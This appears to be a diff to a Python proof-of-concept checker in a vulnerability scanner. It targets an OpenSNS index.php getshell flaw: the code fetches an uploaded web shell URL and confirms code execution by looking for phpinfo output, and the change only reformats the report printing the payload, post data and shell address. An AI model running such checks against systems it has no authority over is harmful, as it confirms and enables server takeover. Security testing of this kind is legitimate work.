@@ -31,7 +31,7 @@ class opensns_index_getshell_BaseVerify:
             shellurl = req.text[pos::].replace("\\","").strip('"}')
             req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
             if r"Configuration File (php.ini) Path" in req2.text:
-                cprint("[+]存在opensns index.php 前台getshell漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data)+"\tshell地址: "+shellurl, "red")
+                cprint("[+]存在opensns index.php 前台getshell漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshell地址: "+shellurl, "red")
 
         except:
             cprint("[-] "+__file__+"====>连接超时", "cyan")
